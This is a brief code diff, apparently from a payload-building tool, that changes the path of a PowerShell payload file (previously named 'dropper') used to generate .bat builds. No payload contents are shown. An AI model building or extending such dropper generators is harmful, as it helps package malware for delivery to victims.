@@ -10,7 +10,7 @@ class Build :
 	def Builder(self) :
 
 		path = "output/builds/" # Builds file
-		payload = "payloads/powershell/dropper.txt" # Payload file
+		payload = "data/payloads/powershell/powershell.txt" # Payload file
 		build = "{}{}".format(self.extension, ".bat") # Make .bat file
 		
 		try:
